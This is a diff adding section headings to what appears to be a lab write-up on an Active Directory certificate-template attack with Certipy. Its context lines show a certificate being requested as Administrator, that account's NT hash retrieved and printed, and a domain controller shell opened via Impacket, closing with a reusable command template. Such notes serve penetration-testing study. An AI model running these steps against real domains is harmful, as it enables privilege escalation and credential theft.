@@ -11,6 +11,8 @@ Take note of the Template Name and Certificate Authority:
 
 ![[Pasted image 20241005173153.png]]
 
+### Certificate Request
+
 Use the `-upn` to specify the alternative subject. In this case the Administrator:
 
 ```bash
@@ -25,7 +27,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-Certificate Authentication
+### Certificate Authentication
 
 We can retrieve the NTLMv1 hash for the targeted user:
 
@@ -40,6 +42,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
 ```
+
+### Using the TGT
 
 We can also authenticate to a domain controller using the TGT saved. This requires the DC to be resolved using DNS:
 
@@ -56,7 +60,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 C:\>
 ```
 
-Summary
+### Summary
 
 ```bash
 certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain -dc-ip <adcs_ip>
